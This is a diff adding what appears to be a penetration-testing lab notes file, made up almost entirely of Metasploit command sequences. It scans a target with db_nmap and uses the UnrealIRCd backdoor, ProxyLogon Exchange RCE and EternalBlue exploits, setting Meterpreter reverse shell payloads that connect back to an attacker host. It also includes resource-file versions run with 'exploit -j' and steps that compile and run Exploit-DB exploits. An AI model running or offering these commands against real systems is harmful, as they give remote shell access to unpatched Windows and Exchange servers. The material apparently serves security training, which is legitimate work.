@@ -1,0 +1,55 @@
+sudo systemctl start postgresql.service 
+sudo msfdb init
+#msfconsole
+    db_status
+    workspace -h
+    workspace -a Fourthedition
+    workspace
+    db_nmap -vv -sC -Pn -p- 10.10.10.8 --save
+    search UnrealIRCd
+    info 0
+    use exploit/unix/irc/unreal_ircd_3281_backdoor
+
+python3 proxyshell-enumerate.py –u <Exchange server IP>
+
+sudo msfconsole
+search proxylogon
+use exploit/windows/http/exchange_proxylogon_rce
+set payload windows/meterpreter/reverse_https
+set rhosts <your Exchange server IP>
+set email <administrator email id>
+set lhost <Your Kali IP>
+set lport <You kali port>
+
+sudo msfconsole
+search eternal
+use exploit/windows/smb/ms17_010_eternalblue
+set payload windows/meterpreter/reverse_https
+set rhosts <your Exchange server IP>
+set lhost <Your Kali IP>
+set lport <You kali port>
+
+#MSFResource files
+
+use exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/meterpreter/reverse_tcp
+set rhost xx.xx.xx.xx
+set lhost xx.xx.xx.xx
+set lport 4444
+exploit -j
+use exploit/windows/http/exchange_proxylogon_rce
+set payload windows/meterpreter/reverse_https
+set rhost xx.xx.xx.xx
+set lhost xx.xx.xx.xx
+set lport 443
+exploit -j
+
+cp /usr/share/exploitdb/exploits/windows/remote/3996.c apache.c
+gcc apache.c -o apache
+./apache
+
+
+sudo cp /usr/share/exploitdb/exploits/windows/remote/16756.rb /usr/share/metasploit-framework/modules/exploits/windows/http/NewExploit.rb
+
+
+
